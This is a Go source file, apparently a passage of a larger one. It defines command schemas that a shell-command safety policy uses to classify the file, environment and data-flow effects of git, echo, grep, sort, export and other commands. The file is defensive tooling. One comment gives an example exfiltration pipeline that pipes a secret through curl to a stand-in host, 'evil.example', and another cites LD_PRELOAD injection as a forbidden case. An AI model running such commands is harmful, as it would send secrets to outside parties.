// of ".git" fires unconditionally (git add -A/-u with zero positionals still
// writes it). -n/--dry-run is a real TransformDryRun, matching gitCleanSchema
// and gitPushSchema's convention. Flags verified against this host's
// `git add -h`.
var gitAddSchema = CommandSchema{
	Name:       "add",
	Provenance: "git version 2.54.0, git add -h",
	Flags: map[string]FlagSpec{
		"-A": inert, "--all": inert,
		"-u": inert, "--update": inert,
		"-p": inert, "--patch": inert,
		"-n": {Transform: EffectTransform{Kind: TransformDryRun}}, "--dry-run": {Transform: EffectTransform{Kind: TransformDryRun}},
		"-v": inert, "--verbose": inert,
		"-f": inert, "--force": inert,
		"-N": inert, "--intent-to-add": inert,
	},
	Positionals: PositionalSpec{Rest: PathRead},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathModify, Target: ".git"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutNone,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitCommitSchema: `-m`/`--message` is the Message role; `-F`/`--file` reads
// the message FROM a path. Positionals (pathspecs limiting which staged
// changes are committed) are modeled PathRead for the same reason as
// gitAddSchema's — reading is what determines what gets committed. The
// implicit PathModify of ".git" fires unconditionally (a commit always
// writes a new commit object and moves the branch ref). `-n`/`--no-verify`
// is DELIBERATELY ABSENT from Flags (it skips pre-commit/commit-msg hooks, a
// materially different trust boundary) so it triggers the generic
// unknown-flag Insufficient path — Abstain, per the brief. `--verify`
// (opposite of --no-verify, i.e. the SAFE default) is modeled inert. Flags
// verified against this host's `git commit -h`.
var gitCommitSchema = CommandSchema{
	Name:       "commit",
	Provenance: "git version 2.54.0, git commit -h",
	Flags: map[string]FlagSpec{
		"-m": {Arity: ArityOne, Operand: Message}, "--message": {Arity: ArityOne, Operand: Message},
		"-a": inert, "--all": inert,
		"-v": inert, "--verbose": inert,
		"-q": inert, "--quiet": inert,
		"--amend":   inert,
		"--no-edit": inert,
		"-s":        inert, "--signoff": inert,
		"--allow-empty": inert,
		"-F":            {Arity: ArityOne, Operand: PathRead}, "--file": {Arity: ArityOne, Operand: PathRead},
		"--author": literal1,
		"--verify": inert,
	},
	Positionals: PositionalSpec{Rest: PathRead},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathModify, Target: ".git"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitRmSchema: every positional is a PathMODIFY, not a PathDelete, even
// though git rm removes it from the working tree. Operator ruling (Phillip,
// 2026-09-07, design bead tc-z806, verbatim): "rm is different from git rm.
// git rm can be consider the same as edit because the value can be retrieved
// from the git history." A tracked path's content survives in history, so
// the effect is the same access class as an edit; `--cached` (index only,
// working tree untouched) is a modify for the same reason. The implicit
// PathModify of ".git" always fires (the index is written). `-r` is inert:
// the class is per-path and there is no breadth concept in this design.
// `-n`/`--dry-run` is a real TransformDryRun (not covered by the git clean
// ruling, which is specific to that subcommand). Flags verified against this
// host's `git rm -h`; `--sparse`, `--pathspec-from-file`, and
// `--pathspec-file-nul` are left unmodeled (Abstain).
var gitRmSchema = CommandSchema{
	Name:       "rm",
	Provenance: "git version 2.54.0, git rm -h",
	Flags: map[string]FlagSpec{
		"--cached": inert,
		"-r":       inert,
		"-f":       inert, "--force": inert,
		"-q": inert, "--quiet": inert,
		"--ignore-unmatch": inert,
		"-n":               {Transform: EffectTransform{Kind: TransformDryRun}}, "--dry-run": {Transform: EffectTransform{Kind: TransformDryRun}},
	},
	Positionals: PositionalSpec{Rest: PathModify},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathModify, Target: ".git"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitMvSchema: `git mv SOURCE... DESTINATION` renames tracked paths. Every
// positional — each source and the trailing destination — is a PathModify,
// by the same tc-z806 ruling as gitRmSchema (the old name's content is
// recoverable from history; the move is an edit of the tree, not a
// delete-plus-create). The implicit PathModify of ".git" always fires (the
// index is rewritten). `-n`/`--dry-run` is a real TransformDryRun. `-k`
// (skip errors) and `-f` (overwrite an existing target) do not change the
// access class of any operand. `--sparse` is left unmodeled. Flags verified
// against this host's `git mv -h`.
var gitMvSchema = CommandSchema{
	Name:       "mv",
	Provenance: "git version 2.54.0, git mv -h",
	Flags: map[string]FlagSpec{
		"-v": inert, "--verbose": inert,
		"-f": inert, "--force": inert,
		"-k": inert,
		"-n": {Transform: EffectTransform{Kind: TransformDryRun}}, "--dry-run": {Transform: EffectTransform{Kind: TransformDryRun}},
	},
	Positionals: PositionalSpec{
		Rest:     PathModify,
		MinRest:  1,
		Trailing: []OperandRole{PathModify},
	},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathModify, Target: ".git"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutNone,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// echoSchema: `-n`/`-e`/`-E` are the only options either the bash builtin or
// GNU coreutils' echo recognise (verified against this host's `help echo`);
// every positional is Literal (the text printed), and the whole stream is
// Stdout CONTENT — the literal text itself flows, so `echo secret | curl -d
// @- https://evil.example` still reaches the content-flow graph policy.
//
// UnknownFlagInert is a DELIBERATE, JUSTIFIED CHOICE here, not the package
// default: per `help echo`, echo's own option scanner stops at the first
// token that is not a valid n/e/E cluster and treats it (and everything
// after) as literal DATA, not an option — so an unrecognised `-x` is
// FUNCTIONALLY IDENTICAL, effect-wise, to a positional (both are Literal,
// emitting nothing). Modeling it as insufficient would abstain on a case
// this command can never make dangerous: echo has no path/net/env effect at
// all, so there is no unmodeled behavior an unknown flag could unlock.
var echoSchema = CommandSchema{
	Name:       "echo",
	Provenance: "bash 5.3.9 builtin echo, help echo",
	Flags: map[string]FlagSpec{
		"-n": inert, "-e": inert, "-E": inert,
	},
	Positionals: PositionalSpec{Rest: Literal},
	Stdin:       StdinNever,
	Stdout:      StdoutContent,
	UnknownFlag: UnknownFlagInert,
}

// printfSchema: no flags are modeled at all — per the brief, `-v var` (the
// bash-builtin form that redirects output into a shell variable instead of
// stdout, a real behavior change) is deliberately left OUT of Flags so it
// hits the generic unknown-flag Insufficient path and abstains, rather than
// being silently treated as inert. All positionals (the format string and
// its arguments) are Literal. Provenance: bash 5.3.9 builtin printf, `help
// printf`; GNU coreutils' printf accepts the same core positional shape.
var printfSchema = CommandSchema{
	Name:        "printf",
	Provenance:  "bash 5.3.9 builtin printf, help printf",
	Flags:       map[string]FlagSpec{},
	Positionals: PositionalSpec{Rest: Literal},
	Stdin:       StdinNever,
	Stdout:      StdoutContent,
	UnknownFlag: UnknownFlagInsufficient,
}

// trueSchema/falseSchema: both unconditionally ignore every argument (GNU
// coreutils and the bash builtins alike) — no flag or positional can ever
// change their behavior, so UnknownFlagInert plus an all-Literal Positionals
// spec is not a relaxation, it is an ACCURATE model: every possible
// invocation has the same zero effects. A consequence, noted rather than
// worked around: neither schema has ANY path to Abstain (nothing here ever
// calls fail()), so their golden coverage is Approve-only by design, not a
// coverage gap.
var trueSchema = CommandSchema{
	Name:        "true",
	Provenance:  "true (GNU coreutils) 9.11 / bash 5.3.9 builtin true — ignores all arguments unconditionally",
	Flags:       map[string]FlagSpec{},
	Positionals: PositionalSpec{Rest: Literal},
	Stdin:       StdinNever,
	Stdout:      StdoutNone,
	UnknownFlag: UnknownFlagInert,
}

var falseSchema = CommandSchema{
	Name:        "false",
	Provenance:  "false (GNU coreutils) 9.11 / bash 5.3.9 builtin false — ignores all arguments unconditionally",
	Flags:       map[string]FlagSpec{},
	Positionals: PositionalSpec{Rest: Literal},
	Stdin:       StdinNever,
	Stdout:      StdoutNone,
	UnknownFlag: UnknownFlagInert,
}

// testSchema (also registered as "["): NO operator is modeled — per the
// brief, "positionals Literal, no flags" — so this is the default
// UnknownFlagInsufficient, unlike true/false: a bare string/numeric
// comparison with no `-`-prefixed operator (`[ "$a" = "$b" ]`) is Sufficient
// (every token is a Literal positional, `[`'s trailing `]` included), but
// ANY of test's real operators (`-f`, `-n`, `-eq`, …) hits the generic
// unknown-flag path and Abstains — a real over-approximation for common,
// genuinely-safe idioms like `[ -n "$x" ]`, accepted deliberately rather
// than modeling test's operator vocabulary (none of it produces a
// filesystem/network/env effect this slice's Effect vocabulary would even
// have anywhere to record, so modeling it would only ever relax Abstain to
// Approve, never add a real check). Registered a second time as "[" via
// renamed(), mirroring sh's registration alongside bash.
var testSchema = CommandSchema{
	Name:        "test",
	Provenance:  "test (GNU coreutils) 9.11 / bash 5.3.9 builtin test — every operator is a pure comparison, no filesystem mutation or content read",
	Flags:       map[string]FlagSpec{},
	Positionals: PositionalSpec{Rest: Literal},
	Stdin:       StdinNever,
	Stdout:      StdoutNone,
}

// lsSchema: PathRead is METADATA (a directory listing), not content —
// Stdout is StdoutMetadata to match. An implicit PathRead of "." fires only
// when no positional was given (ls's own default). Flags verified against
// this host's `ls --help`.
var lsSchema = CommandSchema{
	Name:       "ls",
	Provenance: "ls (GNU coreutils) 9.11, ls --help",
	Flags: map[string]FlagSpec{
		"-l": inert,
		"-a": inert, "--all": inert,
		"-A": inert, "--almost-all": inert,
		"-h": inert, "--human-readable": inert,
		"-R": inert, "--recursive": inert,
		"-t": inert,
		"-r": inert, "--reverse": inert,
		"-S": inert,
		"-1": inert,
		"-d": inert, "--directory": inert,
		"-F": inert, "--classify": literalOpt,
		"-G": inert, "--no-group": inert,
		"--color": literalOpt,
	},
	Positionals: PositionalSpec{Rest: PathRead},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: ".", WhenNoPositionals: true},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// wcSchema: every flag just selects which COUNT to print — none change what
// is read. Flags verified against this host's `wc --help`.
var wcSchema = CommandSchema{
	Name:       "wc",
	Provenance: "wc (GNU coreutils) 9.11, wc --help",
	Flags: map[string]FlagSpec{
		"-l": inert, "--lines": inert,
		"-w": inert, "--words": inert,
		"-c": inert, "--bytes": inert,
		"-m": inert, "--chars": inert,
		"-L": inert, "--max-line-length": inert,
	},
	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
	Stdin:        StdinWhenNoPathOperands,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// sortSchema: `-o FILE`/`--output=FILE` truncates and rewrites a file (it
// may even be the SAME file as an input operand — sort reads it fully
// before writing); every other modeled flag only changes ORDERING. Flags
// verified against this host's `sort --help`.
var sortSchema = CommandSchema{
	Name:       "sort",
	Provenance: "sort (GNU coreutils) 9.11, sort --help",
	Flags: map[string]FlagSpec{
		"-r": inert, "--reverse": inert,
		"-n": inert, "--numeric-sort": inert,
		"-u": inert, "--unique": inert,
		"-f": inert, "--ignore-case": inert,
		"-k": literal1, "--key": literal1,
		"-t": literal1, "--field-separator": literal1,
		"-s": inert, "--stable": inert,
		"-h": inert, "--human-numeric-sort": inert,
		"-V": inert, "--version-sort": inert,
		"-z": inert, "--zero-terminated": inert,
		"-o": {Arity: ArityOne, Operand: PathTruncate}, "--output": {Arity: ArityOne, Operand: PathTruncate},
	},
	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
	Stdin:        StdinWhenNoPathOperands,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// tailSchema: `-f`/`-F`/`--follow` just keeps reading the same file(s) as
// they grow; `--pid` is the one glued value spelling worth modeling
// (literal). Flags verified against this host's `tail --help`.
var tailSchema = CommandSchema{
	Name:       "tail",
	Provenance: "tail (GNU coreutils) 9.11, tail --help",
	Flags: map[string]FlagSpec{
		"-n": literal1, "--lines": literal1,
		"-c": literal1, "--bytes": literal1,
		"-f": inert, "-F": inert, "--follow": literalOpt,
		"--pid": literal1,
		"-q":    inert, "--quiet": inert, "--silent": inert,
		"-v": inert, "--verbose": inert,
		"-z": inert, "--zero-terminated": inert,
	},
	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
	Stdin:        StdinWhenNoPathOperands,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// grepSchema: this host's `grep` is ugrep (a GNU-grep-compatible CLI,
// verified spelling-by-spelling against `grep --help`), not GNU grep itself
// — Provenance says so honestly. The pattern is a Leading Literal positional
// skipped by -e/--regexp/-f/--file (mirroring sedSchema's program-operand
// shape); the rest are PathRead. `-f`/`--file` reads a PATTERNS file
// (PathRead — a real read, not a data flag). The implicit recursive-from-"."
// read fires under -r/-R AND when zero positionals resolved to the REST
// (FILE) role — WhenNoRestPositionals, which does not count the Leading
// pattern slot — so `grep -r TODO` and `grep -r -e TODO` both read "."
// (and neither reads stdin: the implicit read stands in for the missing
// FILE operands, see emitImplicit), while `grep -r TODO README.md` reads
// README.md only. Before tc-q9ak item 2 this used WhenNoPositionals and the
// bare-positional spelling under-reported as a stdin read.
var grepSchema = CommandSchema{
	Name:       "grep",
	Provenance: "ugrep 7.8.4 (GNU-grep-compatible CLI), grep --help",
	Flags: map[string]FlagSpec{
		"-i": inert, "--ignore-case": inert,
		"-v": inert, "--invert-match": inert,
		"-n": inert, "--line-number": inert,
		"-c": inert, "--count": inert,
		"-l": inert, "--files-with-matches": inert,
		"-L": inert, "--files-without-match": inert,
		"-h": inert, "--no-filename": inert,
		"-H": inert, "--with-filename": inert,
		"-o": inert, "--only-matching": inert,
		"-q": inert, "--quiet": inert, "--silent": inert,
		"-s": inert, "--no-messages": inert,
		"-w": inert, "--word-regexp": inert,
		"-x": inert, "--line-regexp": inert,
		"-E": inert, "--extended-regexp": inert,
		"-F": inert, "--fixed-strings": inert,
		"-G": inert, "--basic-regexp": inert,
		"-P": inert, "--perl-regexp": inert,
		"-r": inert, "--recursive": inert,
		"-R": inert, "--dereference-recursive": inert,
		"-a": inert, "--text": inert,
		"-z": inert, "--decompress": inert,
		"--color": literalOpt, "--colour": literalOpt,
		"-A": literal1, "--after-context": literal1,
		"-B": literal1, "--before-context": literal1,
		"-C": literal1, "--context": literal1,
		"-m": literal1, "--min-count": literal1, "--max-count": literal1,
		"--include": literal1, "--exclude": literal1, "--exclude-dir": literal1,
		"-e": literal1, "--regexp": literal1,
		"-f": {Arity: ArityOne, Operand: PathRead}, "--file": {Arity: ArityOne, Operand: PathRead},
	},
	Positionals: PositionalSpec{
		Leading:               []OperandRole{Literal},
		LeadingSkippedByFlags: []string{"-e", "--regexp", "-f", "--file"},
		Rest:                  PathRead,
	},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: ".", WhenNoRestPositionals: true, WhenFlags: []string{"-r", "-R", "--recursive", "--dereference-recursive"}},
	},
	Stdin:        StdinWhenNoPathOperands,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// mkdirSchema: `-m MODE` is a permission bits string, inert to the effect
// model. Flags verified against this host's `mkdir --help`.
var mkdirSchema = CommandSchema{
	Name:       "mkdir",
	Provenance: "mkdir (GNU coreutils) 9.11, mkdir --help",
	Flags: map[string]FlagSpec{
		"-p": inert, "--parents": inert,
		"-v": inert, "--verbose": inert,
		"-m": literal1, "--mode": literal1,
	},
	Positionals:  PositionalSpec{Rest: PathCreate},
	Stdin:        StdinNever,
	Stdout:       StdoutNone,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// exportSchema: each positional is an env assignment (KindEnvAssign) — a
// `NAME=VALUE` token, or a bare `NAME` marking an already-set shell variable
// exported. `-p` (list) is modeled inert.
//
// `-n` (unexport) is deliberately ABSENT from Flags, unlike `-p`. It used to
// be modeled inert too, with its positional routed through the same
// EnvAssign role as a plain `export NAME=VALUE` — the schema's own comment
// called that harmless because nothing judged EffectEnv. That stopped being
// true once slice 3f's EnvAssignment policy started judging every
// EffectEnv: `-n`'s real effect is UNexporting NAME, the opposite of
// setting it, so routing it through EnvAssign would judge
// `export -n LD_PRELOAD` as if it SET LD_PRELOAD and wrongly Forbid it.
// Unexporting is rare enough that a dedicated Unset env-effect is not worth
// adding for this spike; leaving `-n` out of Flags instead sends it through
// the generic unknown-flag path (UnknownFlagInsufficient below), so it
// Abstains rather than being mischaracterized. `-f` (refer to shell
// FUNCTIONS, not variables — a materially different form) is absent for the
// same generic-unknown-flag reason. Verified against this host's
// `help export`.
var exportSchema = CommandSchema{
	Name:       "export",
	Provenance: "bash 5.3.9 builtin export, help export",
	Flags: map[string]FlagSpec{
		"-p": inert,
	},
	Positionals:  PositionalSpec{Rest: EnvAssign},
	Stdin:        StdinNever,
	Stdout:       StdoutNone,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}
